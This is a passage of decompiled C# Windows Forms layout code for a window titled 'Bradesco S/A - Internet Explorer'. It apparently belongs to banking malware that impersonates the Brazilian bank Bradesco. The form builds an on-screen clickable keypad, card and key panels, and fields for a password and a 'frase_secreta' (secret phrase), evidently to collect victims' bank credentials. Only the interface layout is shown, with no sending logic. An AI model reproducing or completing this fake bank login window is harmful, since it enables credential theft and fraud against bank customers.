		pictureBox33.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox33.set_TabIndex(114);
		pictureBox33.set_TabStop(false);
		((Control)pictureBox33).add_Click((EventHandler)pictureBox33_Click);
		((Control)pictureBox34).set_BackColor(Color.Transparent);
		((Control)pictureBox34).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox34).set_Location(new Point(592, 157));
		((Control)pictureBox34).set_Name("pictureBox34");
		((Control)pictureBox34).set_Size(new Size(21, 20));
		pictureBox34.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox34.set_TabIndex(113);
		pictureBox34.set_TabStop(false);
		((Control)pictureBox34).add_Click((EventHandler)pictureBox34_Click);
		((Control)pictureBox23).set_BackColor(Color.Transparent);
		((Control)pictureBox23).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox23).set_Location(new Point(548, 179));
		((Control)pictureBox23).set_Name("pictureBox23");
		((Control)pictureBox23).set_Size(new Size(21, 20));
		pictureBox23.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox23.set_TabIndex(112);
		pictureBox23.set_TabStop(false);
		((Control)pictureBox23).add_Click((EventHandler)pictureBox23_Click);
		((Control)pictureBox24).set_BackColor(Color.Transparent);
		((Control)pictureBox24).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox24).set_Location(new Point(526, 179));
		((Control)pictureBox24).set_Name("pictureBox24");
		((Control)pictureBox24).set_Size(new Size(21, 20));
		pictureBox24.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox24.set_TabIndex(111);
		pictureBox24.set_TabStop(false);
		((Control)pictureBox24).add_Click((EventHandler)pictureBox24_Click);
		((Control)pictureBox25).set_BackColor(Color.Transparent);
		((Control)pictureBox25).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox25).set_Location(new Point(570, 157));
		((Control)pictureBox25).set_Name("pictureBox25");
		((Control)pictureBox25).set_Size(new Size(21, 20));
		pictureBox25.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox25.set_TabIndex(110);
		pictureBox25.set_TabStop(false);
		((Control)pictureBox25).add_Click((EventHandler)pictureBox25_Click);
		((Control)pictureBox26).set_BackColor(Color.Transparent);
		((Control)pictureBox26).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox26).set_Location(new Point(548, 157));
		((Control)pictureBox26).set_Name("pictureBox26");
		((Control)pictureBox26).set_Size(new Size(21, 20));
		pictureBox26.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox26.set_TabIndex(109);
		pictureBox26.set_TabStop(false);
		((Control)pictureBox26).add_Click((EventHandler)pictureBox26_Click);
		((Control)pictureBox27).set_BackColor(Color.Transparent);
		((Control)pictureBox27).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox27).set_Location(new Point(504, 179));
		((Control)pictureBox27).set_Name("pictureBox27");
		((Control)pictureBox27).set_Size(new Size(21, 20));
		pictureBox27.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox27.set_TabIndex(108);
		pictureBox27.set_TabStop(false);
		((Control)pictureBox27).add_Click((EventHandler)pictureBox27_Click);
		((Control)pictureBox28).set_BackColor(Color.Transparent);
		((Control)pictureBox28).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox28).set_Location(new Point(482, 179));
		((Control)pictureBox28).set_Name("pictureBox28");
		((Control)pictureBox28).set_Size(new Size(21, 20));
		pictureBox28.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox28.set_TabIndex(107);
		pictureBox28.set_TabStop(false);
		((Control)pictureBox28).add_Click((EventHandler)pictureBox28_Click);
		((Control)pictureBox29).set_BackColor(Color.Transparent);
		((Control)pictureBox29).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox29).set_Location(new Point(526, 157));
		((Control)pictureBox29).set_Name("pictureBox29");
		((Control)pictureBox29).set_Size(new Size(21, 20));
		pictureBox29.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox29.set_TabIndex(106);
		pictureBox29.set_TabStop(false);
		((Control)pictureBox29).add_Click((EventHandler)pictureBox29_Click);
		((Control)pictureBox30).set_BackColor(Color.Transparent);
		((Control)pictureBox30).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox30).set_Location(new Point(504, 157));
		((Control)pictureBox30).set_Name("pictureBox30");
		((Control)pictureBox30).set_Size(new Size(21, 20));
		pictureBox30.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox30.set_TabIndex(105);
		pictureBox30.set_TabStop(false);
		((Control)pictureBox30).add_Click((EventHandler)pictureBox30_Click);
		((Control)pictureBox20).set_BackColor(Color.Transparent);
		((Control)pictureBox20).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox20).set_Location(new Point(460, 179));
		((Control)pictureBox20).set_Name("pictureBox20");
		((Control)pictureBox20).set_Size(new Size(21, 20));
		pictureBox20.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox20.set_TabIndex(103);
		pictureBox20.set_TabStop(false);
		((Control)pictureBox20).add_Click((EventHandler)pictureBox20_Click);
		((Control)pictureBox21).set_BackColor(Color.Transparent);
		((Control)pictureBox21).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox21).set_Location(new Point(482, 157));
		((Control)pictureBox21).set_Name("pictureBox21");
		((Control)pictureBox21).set_Size(new Size(21, 20));
		pictureBox21.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox21.set_TabIndex(102);
		pictureBox21.set_TabStop(false);
		((Control)pictureBox21).add_Click((EventHandler)pictureBox21_Click);
		((Control)pictureBox22).set_BackColor(Color.Transparent);
		((Control)pictureBox22).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox22).set_Location(new Point(460, 157));
		((Control)pictureBox22).set_Name("pictureBox22");
		((Control)pictureBox22).set_Size(new Size(21, 20));
		pictureBox22.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox22.set_TabIndex(101);
		pictureBox22.set_TabStop(false);
		((Control)pictureBox22).add_Click((EventHandler)pictureBox22_Click);
		((Control)pictureBox17).set_BackColor(Color.Transparent);
		((Control)pictureBox17).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox17).set_Location(new Point(438, 179));
		((Control)pictureBox17).set_Name("pictureBox17");
		((Control)pictureBox17).set_Size(new Size(21, 20));
		pictureBox17.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox17.set_TabIndex(100);
		pictureBox17.set_TabStop(false);
		((Control)pictureBox17).add_Click((EventHandler)pictureBox17_Click);
		((Control)pictureBox18).set_BackColor(Color.Transparent);
		((Control)pictureBox18).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox18).set_Location(new Point(416, 179));
		((Control)pictureBox18).set_Name("pictureBox18");
		((Control)pictureBox18).set_Size(new Size(21, 20));
		pictureBox18.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox18.set_TabIndex(99);
		pictureBox18.set_TabStop(false);
		((Control)pictureBox18).add_Click((EventHandler)pictureBox18_Click);
		((Control)pictureBox16).set_BackColor(Color.Transparent);
		((Control)pictureBox16).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox16).set_Location(new Point(438, 157));
		((Control)pictureBox16).set_Name("pictureBox16");
		((Control)pictureBox16).set_Size(new Size(21, 20));
		pictureBox16.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox16.set_TabIndex(98);
		pictureBox16.set_TabStop(false);
		((Control)pictureBox16).add_Click((EventHandler)pictureBox16_Click);
		((Control)pictureBox15).set_BackColor(Color.Transparent);
		((Control)pictureBox15).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox15).set_Location(new Point(416, 157));
		((Control)pictureBox15).set_Name("pictureBox15");
		((Control)pictureBox15).set_Size(new Size(21, 20));
		pictureBox15.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox15.set_TabIndex(97);
		pictureBox15.set_TabStop(false);
		((Control)pictureBox15).add_Click((EventHandler)pictureBox15_Click);
		((Control)pictureBox13).set_BackColor(Color.Transparent);
		((Control)pictureBox13).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox13).set_Location(new Point(614, 136));
		((Control)pictureBox13).set_Name("pictureBox13");
		((Control)pictureBox13).set_Size(new Size(20, 19));
		pictureBox13.set_TabIndex(96);
		pictureBox13.set_TabStop(false);
		((Control)pictureBox13).add_Click((EventHandler)pictureBox13_Click);
		((Control)pictureBox14).set_BackColor(Color.Transparent);
		((Control)pictureBox14).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox14).set_Location(new Point(592, 136));
		((Control)pictureBox14).set_Name("pictureBox14");
		((Control)pictureBox14).set_Size(new Size(20, 19));
		pictureBox14.set_TabIndex(95);
		pictureBox14.set_TabStop(false);
		((Control)pictureBox14).add_Click((EventHandler)pictureBox14_Click);
		((Control)pictureBox9).set_BackColor(Color.Transparent);
		((Control)pictureBox9).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox9).set_Location(new Point(570, 136));
		((Control)pictureBox9).set_Name("pictureBox9");
		((Control)pictureBox9).set_Size(new Size(20, 19));
		pictureBox9.set_TabIndex(94);
		pictureBox9.set_TabStop(false);
		((Control)pictureBox9).add_Click((EventHandler)pictureBox9_Click);
		((Control)pictureBox10).set_BackColor(Color.Transparent);
		((Control)pictureBox10).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox10).set_Location(new Point(548, 136));
		((Control)pictureBox10).set_Name("pictureBox10");
		((Control)pictureBox10).set_Size(new Size(20, 19));
		pictureBox10.set_TabIndex(93);
		pictureBox10.set_TabStop(false);
		((Control)pictureBox10).add_Click((EventHandler)pictureBox10_Click);
		((Control)pictureBox11).set_BackColor(Color.Transparent);
		((Control)pictureBox11).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox11).set_Location(new Point(526, 136));
		((Control)pictureBox11).set_Name("pictureBox11");
		((Control)pictureBox11).set_Size(new Size(20, 19));
		pictureBox11.set_TabIndex(92);
		pictureBox11.set_TabStop(false);
		((Control)pictureBox11).add_Click((EventHandler)pictureBox11_Click);
		((Control)pictureBox12).set_BackColor(Color.Transparent);
		((Control)pictureBox12).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox12).set_Location(new Point(504, 136));
		((Control)pictureBox12).set_Name("pictureBox12");
		((Control)pictureBox12).set_Size(new Size(20, 19));
		pictureBox12.set_TabIndex(91);
		pictureBox12.set_TabStop(false);
		((Control)pictureBox12).add_Click((EventHandler)pictureBox12_Click);
		((Control)pictureBox7).set_BackColor(Color.Transparent);
		((Control)pictureBox7).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox7).set_Location(new Point(482, 136));
		((Control)pictureBox7).set_Name("pictureBox7");
		((Control)pictureBox7).set_Size(new Size(20, 19));
		pictureBox7.set_TabIndex(90);
		pictureBox7.set_TabStop(false);
		((Control)pictureBox7).add_Click((EventHandler)pictureBox7_Click);
		((Control)pictureBox8).set_BackColor(Color.Transparent);
		((Control)pictureBox8).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox8).set_Location(new Point(460, 136));
		((Control)pictureBox8).set_Name("pictureBox8");
		((Control)pictureBox8).set_Size(new Size(20, 19));
		pictureBox8.set_TabIndex(89);
		pictureBox8.set_TabStop(false);
		((Control)pictureBox8).add_Click((EventHandler)pictureBox8_Click);
		((Control)pictureBox6).set_BackColor(Color.Transparent);
		((Control)pictureBox6).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox6).set_Location(new Point(438, 136));
		((Control)pictureBox6).set_Name("pictureBox6");
		((Control)pictureBox6).set_Size(new Size(20, 19));
		pictureBox6.set_TabIndex(88);
		pictureBox6.set_TabStop(false);
		((Control)pictureBox6).add_Click((EventHandler)pictureBox6_Click);
		((Control)pictureBox5).set_BackColor(Color.Transparent);
		((Control)pictureBox5).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox5).set_Location(new Point(416, 136));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(20, 19));
		pictureBox5.set_TabIndex(87);
		pictureBox5.set_TabStop(false);
		((Control)pictureBox5).add_Click((EventHandler)pictureBox5_Click_1);
		((Control)pictureBox4).set_BackColor(Color.White);
		((Control)pictureBox4).set_Cursor(Cursors.get_Hand());
		pictureBox4.set_Image((Image)componentResourceManager.GetObject("pictureBox4.Image"));
		((Control)pictureBox4).set_Location(new Point(332, 365));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(50, 17));
		pictureBox4.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox4.set_TabIndex(6);
		pictureBox4.set_TabStop(false);
		((Control)pictureBox4).add_Click((EventHandler)pictureBox4_Click);
		((Control)pictureBox3).set_BackColor(Color.White);
		((Control)pictureBox3).set_Cursor(Cursors.get_Hand());
		pictureBox3.set_Image((Image)componentResourceManager.GetObject("pictureBox3.Image"));
		((Control)pictureBox3).set_Location(new Point(260, 364));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(66, 18));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox3.set_TabIndex(5);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox2).set_BackColor(Color.White);
		((Control)pictureBox2).set_Cursor(Cursors.get_Hand());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(388, 364));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(55, 18));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox2.set_TabIndex(4);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox2).add_Click((EventHandler)pictureBox2_Click);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox1).set_Location(new Point(614, 180));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(21, 20));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox1.set_TabIndex(130);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)isprime).set_BackColor(Color.White);
		isprime.set_Image((Image)componentResourceManager.GetObject("isprime.Image"));
		((Control)isprime).set_Location(new Point(2, 2));
		((Control)isprime).set_Name("isprime");
		((Control)isprime).set_Size(new Size(439, 30));
		isprime.set_TabIndex(131);
		isprime.set_TabStop(false);
		((Control)isprime).set_Visible(false);
		((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)toolStripStatusLabel1 });
		((Control)statusStrip1).set_Location(new Point(0, 556));
		((Control)statusStrip1).set_Name("statusStrip1");
		((Control)statusStrip1).set_Size(new Size(748, 22));
		((Control)statusStrip1).set_TabIndex(132);
		((Control)statusStrip1).set_Text("statusStrip1");
		((ToolStripItem)toolStripStatusLabel1).set_BackColor(Color.Transparent);
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(65, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text("Concluído.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(748, 578));
		((Control)this).get_Controls().Add((Control)(object)statusStrip1);
		((Control)this).get_Controls().Add((Control)(object)isprime);
		((Control)this).get_Controls().Add((Control)(object)Painel_Chave1);
		((Control)this).get_Controls().Add((Control)(object)Painel_Cartao);
		((Control)this).get_Controls().Add((Control)(object)pictureBox44);
		((Control)this).get_Controls().Add((Control)(object)pictureBox43);
		((Control)this).get_Controls().Add((Control)(object)pictureBox35);
		((Control)this).get_Controls().Add((Control)(object)pictureBox36);
		((Control)this).get_Controls().Add((Control)(object)pictureBox37);
		((Control)this).get_Controls().Add((Control)(object)pictureBox38);
		((Control)this).get_Controls().Add((Control)(object)pictureBox39);
		((Control)this).get_Controls().Add((Control)(object)pictureBox40);
		((Control)this).get_Controls().Add((Control)(object)pictureBox41);
		((Control)this).get_Controls().Add((Control)(object)pictureBox42);
		((Control)this).get_Controls().Add((Control)(object)pictureBox31);
		((Control)this).get_Controls().Add((Control)(object)pictureBox32);
		((Control)this).get_Controls().Add((Control)(object)pictureBox33);
		((Control)this).get_Controls().Add((Control)(object)pictureBox34);
		((Control)this).get_Controls().Add((Control)(object)pictureBox23);
		((Control)this).get_Controls().Add((Control)(object)pictureBox24);
		((Control)this).get_Controls().Add((Control)(object)pictureBox25);
		((Control)this).get_Controls().Add((Control)(object)pictureBox26);
		((Control)this).get_Controls().Add((Control)(object)pictureBox27);
		((Control)this).get_Controls().Add((Control)(object)pictureBox28);
		((Control)this).get_Controls().Add((Control)(object)pictureBox29);
		((Control)this).get_Controls().Add((Control)(object)pictureBox30);
		((Control)this).get_Controls().Add((Control)(object)pictureBox20);
		((Control)this).get_Controls().Add((Control)(object)pictureBox21);
		((Control)this).get_Controls().Add((Control)(object)pictureBox22);
		((Control)this).get_Controls().Add((Control)(object)pictureBox17);
		((Control)this).get_Controls().Add((Control)(object)pictureBox18);
		((Control)this).get_Controls().Add((Control)(object)pictureBox16);
		((Control)this).get_Controls().Add((Control)(object)pictureBox15);
		((Control)this).get_Controls().Add((Control)(object)pictureBox13);
		((Control)this).get_Controls().Add((Control)(object)pictureBox14);
		((Control)this).get_Controls().Add((Control)(object)pictureBox9);
		((Control)this).get_Controls().Add((Control)(object)pictureBox10);
		((Control)this).get_Controls().Add((Control)(object)pictureBox11);
		((Control)this).get_Controls().Add((Control)(object)pictureBox12);
		((Control)this).get_Controls().Add((Control)(object)pictureBox7);
		((Control)this).get_Controls().Add((Control)(object)pictureBox8);
		((Control)this).get_Controls().Add((Control)(object)pictureBox6);
		((Control)this).get_Controls().Add((Control)(object)pictureBox5);
		((Control)this).get_Controls().Add((Control)(object)pictureBox4);
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)frase_secreta);
		((Control)this).get_Controls().Add((Control)(object)pass_4);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Brdsc");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Control)this).set_Text("Bradesco S/A - Internet Explorer");
		((Form)this).add_Load((EventHandler)Brdsc_Load);
		((Control)Painel_Chave1).ResumeLayout(false);
		((Control)Painel_Chave1).PerformLayout();
		((ISupportInitialize)pictureBox58).EndInit();
		((Control)Painel_Cartao).ResumeLayout(false);
		((Control)Painel_Cartao).PerformLayout();
		((ISupportInitialize)pictureBox57).EndInit();
		((ISupportInitialize)pictureBox51).EndInit();
		((ISupportInitialize)pictureBox52).EndInit();
		((ISupportInitialize)pictureBox56).EndInit();
		((ISupportInitialize)pictureBox48).EndInit();
		((ISupportInitialize)pictureBox49).EndInit();
		((ISupportInitialize)pictureBox50).EndInit();
		((ISupportInitialize)pictureBox55).EndInit();
		((ISupportInitialize)pictureBox54).EndInit();
		((ISupportInitialize)pictureBox53).EndInit();
		((ISupportInitialize)pictureBox47).EndInit();
		((ISupportInitialize)pictureBox44).EndInit();
		((ISupportInitialize)pictureBox43).EndInit();
		((ISupportInitialize)pictureBox35).EndInit();
		((ISupportInitialize)pictureBox36).EndInit();
		((ISupportInitialize)pictureBox37).EndInit();
		((ISupportInitialize)pictureBox38).EndInit();
		((ISupportInitialize)pictureBox39).EndInit();
		((ISupportInitialize)pictureBox40).EndInit();
		((ISupportInitialize)pictureBox41).EndInit();
		((ISupportInitialize)pictureBox42).EndInit();
		((ISupportInitialize)pictureBox31).EndInit();
		((ISupportInitialize)pictureBox32).EndInit();
		((ISupportInitialize)pictureBox33).EndInit();
		((ISupportInitialize)pictureBox34).EndInit();
		((ISupportInitialize)pictureBox23).EndInit();
		((ISupportInitialize)pictureBox24).EndInit();
		((ISupportInitialize)pictureBox25).EndInit();
		((ISupportInitialize)pictureBox26).EndInit();
		((ISupportInitialize)pictureBox27).EndInit();
		((ISupportInitialize)pictureBox28).EndInit();
		((ISupportInitialize)pictureBox29).EndInit();
		((ISupportInitialize)pictureBox30).EndInit();
		((ISupportInitialize)pictureBox20).EndInit();
		((ISupportInitialize)pictureBox21).EndInit();
		((ISupportInitialize)pictureBox22).EndInit();
		((ISupportInitialize)pictureBox17).EndInit();
		((ISupportInitialize)pictureBox18).EndInit();
		((ISupportInitialize)pictureBox16).EndInit();
		((ISupportInitialize)pictureBox15).EndInit();
		((ISupportInitialize)pictureBox13).EndInit();
		((ISupportInitialize)pictureBox14).EndInit();
		((ISupportInitialize)pictureBox9).EndInit();
		((ISupportInitialize)pictureBox10).EndInit();
		((ISupportInitialize)pictureBox11).EndInit();
		((ISupportInitialize)pictureBox12).EndInit();
		((ISupportInitialize)pictureBox7).EndInit();
		((ISupportInitialize)pictureBox8).EndInit();
		((ISupportInitialize)pictureBox6).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)isprime).EndInit();
		((Control)statusStrip1).ResumeLayout(false);
		((Control)statusStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
